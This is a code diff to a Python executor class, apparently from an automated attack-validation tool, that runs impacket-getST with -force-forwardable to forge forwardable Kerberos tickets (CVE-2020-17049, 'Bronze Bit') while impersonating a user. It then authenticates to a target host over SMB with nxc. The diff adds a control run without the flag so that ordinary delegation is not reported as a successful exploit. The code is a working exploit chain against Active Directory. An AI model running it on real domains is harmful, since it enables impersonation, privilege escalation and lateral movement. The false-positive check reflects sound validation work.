@@ -109,15 +109,33 @@ class BronzeBitExecutor(ValidationExecutor):
             steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                     returncode=res.returncode, note=note))
 
-        getst_argv = ["impacket-getST", "-spn", spn, "-impersonate", impersonate,
-                      "-force-forwardable", "-dc-ip", cfg.dc_ip]
+        base_argv = ["impacket-getST", "-spn", spn, "-impersonate", impersonate, "-dc-ip", cfg.dc_ip]
         if altservice:
-            getst_argv += ["-altservice", altservice]
-        getst_argv += s4u.getst_key_flags(cfg) + [s4u.op_auth_target(cfg, svc)]
+            base_argv += ["-altservice", altservice]
+        key_and_target = s4u.getst_key_flags(cfg) + [s4u.op_auth_target(cfg, svc)]
+
+        # 1) NEGATIVE CONTROL -- ordinary getST (NO -force-forwardable). If this SUCCEEDS,
+        #    the account's S4U2self ticket is already forwardable (e.g. protocol transition)
+        #    and S4U2proxy works WITHOUT the CVE -> ordinary constrained delegation, not
+        #    Bronze Bit (review HIGH: -force-forwardable on such an account is a no-op that
+        #    would falsely read as `exploited`). A true CVE case needs the control to FAIL.
+        ctrl_argv = base_argv + key_and_target
+        res = ctx.runner.run(ctrl_argv, timeout=cfg.tool_timeout_s,
+                             env={"KRB5CCNAME": None}, cwd=str(out_dir))
+        if s4u.parse_ticket(res.stdout or "", out_dir) is not None:
+            rec("getST_control", ctrl_argv, res, True,
+                note="ordinary delegation succeeds WITHOUT the CVE (not Bronze Bit)")
+            errors.append("ordinary_delegation")
+            return self._result(steps, errors, None, False, svc, impersonate, spn,
+                                target_host, "ordinary_delegation", cfg)
+        rec("getST_control", ctrl_argv, res, False,
+            note="control non-forwardable (as the CVE case requires)")
+
+        # 2) POSITIVE -- -force-forwardable (the CVE-2020-17049 forgery).
+        getst_argv = base_argv + ["-force-forwardable"] + key_and_target
         res = ctx.runner.run(getst_argv, timeout=cfg.tool_timeout_s,
                              env={"KRB5CCNAME": None}, cwd=str(out_dir))
         ticket = s4u.parse_ticket(res.stdout or "", out_dir)
-
         if ticket is None:
             # No forged ticket: CLASSIFY the target from the Kerberos error (the carrier).
             reason = s4u.classify_kerberos_failure((res.stdout or "") + "\n" + (res.stderr or "")) \
@@ -126,7 +144,8 @@ class BronzeBitExecutor(ValidationExecutor):
             errors.append(reason)
             return self._result(steps, errors, None, False, svc, impersonate, spn,
                                 target_host, reason, cfg)
-        rec("getST_force_forwardable", getst_argv, res, True, note="forged ticket accepted")
+        rec("getST_force_forwardable", getst_argv, res, True,
+            note="forged forwardable ticket accepted (control had failed)")
 
         nxc_argv = ["nxc", "smb", target_host, "-k", "--use-kcache",
                     *netresolve.nxc_kerberos_flags(cfg)]
